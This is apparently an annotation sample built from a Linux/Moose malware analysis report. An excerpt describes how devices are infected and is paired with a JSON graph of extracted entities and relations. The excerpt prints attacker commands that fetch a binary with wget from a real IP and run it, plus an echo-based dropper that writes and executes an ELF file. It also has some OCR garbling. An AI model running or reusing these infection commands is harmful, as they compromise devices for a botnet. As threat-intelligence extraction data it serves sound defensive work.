@@ -1,0 +1,81 @@
+
+
+
+Sentence : Dissecting Linux/Moose
+We’ve witnessed two main class of commands sent to perform the infection. The first one is a classic
+download and execute using ~~wget~~ :
+```
+   # cd /var
+# rm ./elan2
+   rm: cannot remove `./elan2': No such file or directory
+   # wget http://77.247.177.36:81/xx/atheros_mips/elan2
+   Connecting to 77.247.177.36[77.247.177.36]:81
+   200 OK, File Get Success
+# chmod +x ./elan2
+# ./elan2
+   Sys init: OK
+Status: OK
+```
+The second technique is encoding the binary into several ~~echo~~ commands that are executed
+on the victim and redirecting output into a file that is later executed:
+```
+   # cp /bin/ls /dev/elan2
+   # echo -n -e "\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\
+
+\x02\x00\x28\x00\x01\x00\x00\x00\x90\x81\x00\x00\x34\x00\x00\x00\xb4\xe9\x01\
+\x00\x02\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x0d\x00" > /dev/elan2
+
+# echo -n -e "\x9d\xe8\xbc\x1d\x03\x00\x44\x90\x02\x00\x94\xd8\x02\x00\xa4\x1d\
+
+\x03\x00\x0d\xc0\xa0\xe1\x00\xd8\x2d\xe9\x04\xb0\x4c\xe2\xa4\xd0\x4d\xe2\xa8\
+\x00\x0b\xe5\x01\x30\xa0\xe1\xac\x30\x4b\xe5\x01\x30\xa0\xe3" >> /dev/elan2
+
+...
+# echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\xe9\x01\x00\x56\x00\
+
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" >> /
+
+dev/elan2
+# chmod +x /dev/elan2
+# /dev/elan2
+   Sys init: OK
+Status: OK
+```
+No matter the method, by that point the victim has been infected: it will reach the configuration
+C&C server, obtain its configuration parameters, and start its nefarious activities.
+This two-stage mechanism allows for the report C&C server to specify a URL to an ELF binary
+that will match the architecture and environment found by the various checks it performed.
+Plus, it enables the operators to add support for new target platforms without having to upgrade
+their botnet — but only their distribution methods on the report C&C server.
+Moose’s Excentricity — Optional Behaviors
+We just described the most common scanning behavior, but its configuration can alter
+how it is performed. Here a summary of some of those configuration flags and their effects:
+~~Table 5.~~ ~~Partial List of Moose's Confguration Flags~~ i
+Configuration parameter Description
+~~cnccfg_fag_scanner_sniffer~~ l If this flag is disabled there will be no per-interface
+scanner
+~~cnccfg_fag_nolocalscan~~ l Disables the closely related IP address network scan
+~~cnccfg_fag_noextscan~~ l Disables the random IP address scan
+28
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "/var", "type" : "SYSP"},
+        {"id": 2, "description": "./elan2", "type" : "DOCF"},
+        {"id": 3, "description": "http://77.247.177.36:81/xx/atheros_mips/elan2", "type" : "URLS"},
+        {"id": 4, "description": "77.247.177.36", "type" : "CCSH"},
+        {"id": 5, "description": "/bin/ls", "type" : "EXEF"},
+        {"id": 6, "description": "/dev/elan2", "type" : "DOCF"},
+        {"id": 7, "description": "C&C server", "type" : "CCSH"},
+        {"id": 8, "description": "configuration parameters", "type" : "TAMP"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "contains file"},
+        {"source": 3, "target": 2, "rel_name" : "downloaded from"},
+        {"source": 4, "target": 3, "rel_name" : "hosted by"},
+        {"source": 5, "target": 6, "rel_name" : "copied to"},
+        {"source": 7, "target": 8, "rel_name" : "provides"},
+        {"source": 2, "target": 7, "rel_name" : "connects to"},
+        {"source": 6, "target": 7, "rel_name" : "connects to"}
+    ]
+}
